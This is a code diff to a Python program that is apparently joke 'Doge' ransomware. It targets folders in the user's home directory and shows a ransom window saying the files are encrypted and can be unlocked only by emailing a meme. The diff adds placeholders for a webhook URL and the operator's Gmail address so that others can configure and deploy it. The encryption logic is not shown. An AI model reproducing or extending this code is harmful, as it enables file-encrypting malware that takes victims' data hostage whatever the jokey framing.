@@ -7,6 +7,9 @@ import time
 import tkinter
 import tkinter.messagebox
 
+WEBHOOK_URL = "YOUR WEBHOOK URL HERE"
+EMAIL = "GMAIL ADDRESS WITHOUT @GMAIL.COM"
+
 main_dirs = ["desktop", "documents", "downloads", "music", "pictures", "videos"]
 home = os.path.expanduser("~")
 
@@ -71,7 +74,7 @@ class Window(tkinter.Tk):
 
         self.label_image = tkinter.Label(self, image=self.image)
         self.label_title = tkinter.Label(self, justify="left", wraplength=430, font=("Comic Sans MS", 16, "bold"), fg="red", text="Oh no! Doge has encrypted your files!")
-        self.label_info = tkinter.Label(self, justify="left", wraplength=360, font=("Comic Sans MS", 12, "normal"), text=f"That was really silly of him. To unlock your files, you must make a doge meme and send it to ransomdoge+{self.uid}@gmail.com. Your meme must be original, or Doge will be displeased. If your meme is to Doge's liking, he will send back a key that you can use to unlock your files.")
+        self.label_info = tkinter.Label(self, justify="left", wraplength=360, font=("Comic Sans MS", 12, "normal"), text=f"That was really silly of him. To unlock your files, you must make a doge meme and send it to {EMAIL}+{self.uid}@gmail.com. Your meme must be original, or Doge will be displeased. If your meme is to Doge's liking, he will send back a key that you can use to unlock your files.")
         self.key_input = tkinter.Entry(self, width=45, font=("Comic Sans MS", 10, "normal"))
         self.button = tkinter.Button(self, text="Unlock", command=self.try_key)
         
